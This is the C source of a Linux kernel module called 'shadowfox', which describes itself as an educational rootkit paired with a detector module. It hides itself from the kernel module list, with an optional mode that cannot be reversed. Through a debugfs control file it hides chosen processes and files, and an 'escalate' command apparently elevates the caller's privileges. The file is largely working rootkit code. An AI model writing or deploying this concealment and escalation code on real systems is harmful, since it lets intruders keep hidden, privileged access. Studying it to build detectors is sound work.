// SPDX-License-Identifier: GPL-2.0
/*
 * shadowfox: educational kernel module for the shadowfox + lighthouse
 * project. Stage 1 implements module-list concealment paired with a
 * matching detector in the lighthouse module.
 *
 * This commit adds the actual hide/restore behaviour wired up to a
 * load-time module parameter and a runtime debugfs control file.
 *
 *   Module parameter (read-only after load):
 *     hidden=0|1   default 0
 *                  0: load visibly; toggle later via debugfs.
 *                  1: load and immediately conceal.
 *
 *   Runtime control (debugfs is NOT under /sys/module, so it stays
 *   reachable while the module is concealed):
 *     echo hide   > /sys/kernel/debug/shadowfox/ctl
 *     echo unhide > /sys/kernel/debug/shadowfox/ctl
 *
 * Lifecycle:
 *   - Init: resolve kernel symbols, create the debugfs tree, then
 *     (if requested) hide. Debugfs creation must precede hide so
 *     teardown order is symmetrical and the control file is always
 *     present before any concealment is active.
 *   - Exit: defensive sf_restore() (no-op if visible), then remove
 *     the debugfs tree. find_module() walks the modules list, so
 *     rmmod can only reach us when we are not hidden — exit therefore
 *     normally observes a visible state, but calling restore anyway
 *     keeps the teardown path correct under any future scenario in
 *     which exit is reached with hidden=true (e.g. forced unload).
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/debugfs.h>
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/printk.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#include "cred.h"
#include "hide_files.h"
#include "hide_module.h"
#include "hide_proc.h"
#include "symbols.h"

static bool hidden;
module_param(hidden, bool, 0444);
MODULE_PARM_DESC(hidden,
		 "Start in hidden state (default 0; toggle at runtime via debugfs)");

/*
 * permanent_hide selects which concealment mode `hide` (whether
 * via the hidden=1 module param or a debugfs write) actually
 * performs. See hide_module.c for the trade-offs.
 *
 *   0 (default): list-only hide; clean restore + clean rmmod work.
 *   1          : list + /sys/module hide; no restore; reboot to unload.
 */
static bool permanent_hide;
module_param(permanent_hide, bool, 0444);
MODULE_PARM_DESC(permanent_hide,
		 "Use full-surface hide (no restore, reboot to unload). Default 0 = list-only, restorable.");

static struct dentry *sf_debugfs_dir;

static ssize_t sf_ctl_write(struct file *f, const char __user *ubuf,
			    size_t len, loff_t *off)
{
	char buf[320];	/* room for "hide-file " (10) + NAME_MAX (255) + slack */
	size_t n;
	int ret;

	if (len == 0)
		return 0;

	n = min(len, sizeof(buf) - 1);
	if (copy_from_user(buf, ubuf, n))
		return -EFAULT;
	buf[n] = '\0';

	/* Trim a single trailing newline so `echo hide > ctl` works. */
	if (n > 0 && buf[n - 1] == '\n')
		buf[n - 1] = '\0';

	if (!strcmp(buf, "hide")) {
		ret = sf_hide(permanent_hide);
	} else if (!strcmp(buf, "unhide") || !strcmp(buf, "restore")) {
		ret = sf_restore();
	} else if (!strcmp(buf, "escalate")) {
		ret = sf_escalate_current();
	} else if (!strncmp(buf, "hide-pid ", 9)) {
		pid_t pid;

		if (kstrtoint(buf + 9, 10, &pid))
			return -EINVAL;
		ret = sf_proc_hide_pid(pid);
	} else if (!strncmp(buf, "show-pid ", 9)) {
		pid_t pid;

		if (kstrtoint(buf + 9, 10, &pid))
			return -EINVAL;
		ret = sf_proc_show_pid(pid);
	} else if (!strcmp(buf, "clear-hidden-pids")) {
		sf_proc_clear_hidden();
		ret = 0;
	} else if (!strncmp(buf, "hide-file ", 10)) {
		ret = sf_files_hide(buf + 10);
	} else if (!strncmp(buf, "show-file ", 10)) {
		ret = sf_files_show(buf + 10);
	} else if (!strcmp(buf, "clear-hidden-files")) {
		sf_files_clear();
		ret = 0;
	} else {
		return -EINVAL;
	}

	return ret < 0 ? ret : len;
}

static const struct file_operations sf_ctl_fops = {
	.owner		= THIS_MODULE,
	.write		= sf_ctl_write,
	.llseek		= no_llseek,
};

static int __init shadowfox_init(void)
{
	struct dentry *ctl;
	int ret;

	pr_info("loading (stage 1: concealment); hidden=%d\n", hidden);

	ret = sf_symbols_init();
	if (ret < 0) {
		pr_err("symbol resolution failed: %d\n", ret);
		return ret;
	}

	sf_debugfs_dir = debugfs_create_dir(KBUILD_MODNAME, NULL);
	if (IS_ERR(sf_debugfs_dir)) {
		ret = PTR_ERR(sf_debugfs_dir);
		pr_err("debugfs_create_dir failed: %d\n", ret);
		return ret;
	}

	ctl = debugfs_create_file("ctl", 0200, sf_debugfs_dir, NULL,
				  &sf_ctl_fops);
	if (IS_ERR(ctl)) {
		ret = PTR_ERR(ctl);
		pr_err("debugfs_create_file(ctl) failed: %d\n", ret);
		debugfs_remove_recursive(sf_debugfs_dir);
		return ret;
	}

	if (hidden) {
		ret = sf_hide(permanent_hide);
		if (ret < 0) {
			pr_err("initial hide failed: %d\n", ret);
			debugfs_remove_recursive(sf_debugfs_dir);
			return ret;
		}
	}

	ret = sf_proc_init();
	if (ret < 0) {
		pr_err("sf_proc_init failed: %d\n", ret);
		sf_restore();
		debugfs_remove_recursive(sf_debugfs_dir);
		return ret;
	}

	pr_info("loaded; hidden=%d; control at /sys/kernel/debug/%s/ctl\n",
		sf_is_hidden(), KBUILD_MODNAME);
	return 0;
}

static void __exit shadowfox_exit(void)
{
	sf_proc_exit();
	sf_files_clear();
	sf_restore();
	debugfs_remove_recursive(sf_debugfs_dir);
	pr_info("unloading\n");
}

module_init(shadowfox_init);
module_exit(shadowfox_exit);

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("avinash.kumar");
MODULE_DESCRIPTION("Educational kernel concealment demo (shadowfox)");
MODULE_VERSION("0.6.0");
